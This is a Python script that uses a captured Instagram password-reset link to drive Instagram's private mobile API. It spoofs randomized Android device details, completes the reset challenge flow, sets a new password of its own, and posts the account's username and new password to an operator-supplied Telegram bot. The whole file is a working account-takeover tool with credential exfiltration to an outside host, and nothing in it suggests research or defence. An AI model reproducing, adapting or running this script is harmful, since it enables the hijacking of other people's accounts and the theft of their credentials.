import os
import re
import json
import random
import string
import uuid
import requests
from datetime import datetime
from urllib.parse import urlparse, parse_qs


BLOKS_VER = "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"


# ── Device / session helpers ──────────────────────────────────────────────────

def generate_device_info(custom_password=None):
    android_id  = "android-" + "".join(random.choices(string.hexdigits.lower(), k=16))
    user_agent  = (
        f"Instagram 394.0.0.46.81 Android "
        f"({random.choice(['28/9','29/10','30/11','31/12'])}; "
        f"{random.choice(['240dpi','320dpi','480dpi'])}; "
        f"{random.choice(['720x1280','1080x1920','1440x2560'])}; "
        f"{random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; "
        f"{random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; "
        f"intel; en_US; {random.randint(100000000, 999999999)})"
    )
    waterfall_id = str(uuid.uuid4())
    timestamp    = int(datetime.now().timestamp())

    if custom_password:
        plain = custom_password
    else:
        nums  = "".join([str(random.randint(1, 100)) for _ in range(4)])
        plain = f"@hasu{nums}"

    # Mobile version-0 format: no encryption, password embedded after last ":"
    enc_password = f"#PWD_INSTAGRAM:0:{timestamp}:{plain}"
    return android_id, user_agent, waterfall_id, enc_password, plain


def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": BLOKS_VER,
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481",
    }


# ── Token parsing ─────────────────────────────────────────────────────────────

def parse_reset_link(reset_link):
    parsed = urlparse(reset_link)
    qs     = parse_qs(parsed.query)
    uidb36 = qs.get("uidb36", [None])[0]
    token_raw = qs.get("token", [None])[0]
    # Mobile API needs only the base token (before ":one_click_login_email")
    token = token_raw.split(":")[0] if token_raw else None
    return uidb36, token


# ── Username lookup ───────────────────────────────────────────────────────────

def id_user(user_id):
    try:
        r = requests.get(
            f"https://i.instagram.com/api/v1/users/{user_id}/info/",
            headers={"User-Agent": "Instagram 219.0.0.12.117 Android"},
            timeout=10,
        )
        return r.json()["user"]["username"]
    except Exception:
        return None


# ── Telegram ──────────────────────────────────────────────────────────────────

def send_telegram(bot_token, chat_id, text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={"chat_id": chat_id, "text": text},
            timeout=10,
        )
    except Exception:
        pass


# ── Main reset flow ───────────────────────────────────────────────────────────

def reset_instagram_password(reset_link, chat_id, bot_token, custom_password=None):
    try:
        uidb36, token = parse_reset_link(reset_link)
        if not uidb36 or not token:
            return {"success": False, "error": "Could not parse uidb36/token from reset link"}

        android_id, user_agent, waterfall_id, enc_password, plain_password = \
            generate_device_info(custom_password)

        # ── Step 1: initiate password reset ──────────────────────────────────
        # POST i.instagram.com/api/v1/accounts/password_reset/
        # Returns: user_id, cni, nonce_code, challenge_context
        #          + Ig-Set-X-Mid header (mid)
        r1 = requests.post(
            "https://i.instagram.com/api/v1/accounts/password_reset/",
            headers=make_headers(user_agent=user_agent),
            data={
                "source":       "one_click_login_email",
                "uidb36":       uidb36,
                "device_id":    android_id,
                "token":        token,
                "waterfall_id": waterfall_id,
            },
            timeout=20,
        )

        if "user_id" not in r1.text:
            return {"success": False, "error": f"Step 1 failed: {r1.text[:400]}"}

        mid               = r1.headers.get("Ig-Set-X-Mid", "")
        resp1             = r1.json()
        user_id           = resp1.get("user_id")
        cni               = resp1.get("cni")
        nonce_code        = resp1.get("nonce_code")
        challenge_context = resp1.get("challenge_context")

        bk_client_context = json.dumps({
            "bloks_version": BLOKS_VER,
            "styles_id": "instagram",
        })

        # ── Step 2: get challenge context ─────────────────────────────────────
        # POST i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/
        # Returns a bloks payload from which we parse challenge_context_final
        r2 = requests.post(
            "https://i.instagram.com/api/v1/bloks/apps/"
            "com.instagram.challenge.navigation.take_challenge/",
            headers=make_headers(mid, user_agent),
            data={
                "user_id":           str(user_id),
                "cni":               str(cni),
                "nonce_code":        str(nonce_code),
                "bk_client_context": bk_client_context,
                "challenge_context": str(challenge_context),
                "bloks_versioning_id": BLOKS_VER,
                "get_challenge":     "true",
            },
            timeout=20,
        )

        r2_text = r2.text.replace("\\", "")
        try:
            needle_start = f'(bk.action.i64.Const, {cni}), "'
            needle_end   = '", (bk.action.bool.Const, false)))'
            challenge_context_final = r2_text.split(needle_start)[1].split(needle_end)[0]
            if not challenge_context_final:
                raise ValueError("empty")
        except Exception:
            return {"success": False, "error": f"Step 2 parse failed: {r2.text[:400]}"}

        # ── Step 3: submit new password ───────────────────────────────────────
        requests.post(
            "https://i.instagram.com/api/v1/bloks/apps/"
            "com.instagram.challenge.navigation.take_challenge/",
            headers=make_headers(mid, user_agent),
            data={
                "is_caa":            "False",
                "source":            "",
                "uidb36":            "",
                "error_state":       json.dumps({"type_name": "str", "index": 0, "state_id": 1048583541}),
                "afv":               "",
                "cni":               str(cni),
                "token":             "",
                "has_follow_up_screens": "0",
                "bk_client_context": bk_client_context,
                "challenge_context": challenge_context_final,
                "bloks_versioning_id": BLOKS_VER,
                "enc_new_password1": enc_password,
                "enc_new_password2": enc_password,
            },
            timeout=20,
        )

        # ── Lookup username and notify ─────────────────────────────────────────
        username = id_user(user_id)
        display  = f"@{username}" if username else f"user_id:{user_id}"

        send_telegram(
            bot_token, chat_id,
            f"\U0001d4d7\U0001d4f8\U0001d4f5\U0001d4ea! Password changed.\n\n"
            f"Username: {display}\nPassword: {plain_password}",
        )
        return {"success": True, "username": username, "password": plain_password}

    except requests.HTTPError as e:
        return {
            "success": False,
            "error": f"HTTP error: {e.response.status_code} {e.response.text[:300]}",
        }
    except Exception as e:
        return {"success": False, "error": f"Unexpected error: {e}"}


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--reset-link",      required=True)
    parser.add_argument("--chat-id",         required=True)
    parser.add_argument("--bot-token",       required=True)
    parser.add_argument("--custom-password", default=None)
    args = parser.parse_args()
    result = reset_instagram_password(
        args.reset_link, args.chat_id, args.bot_token, args.custom_password or None
    )
    print(json.dumps(result))
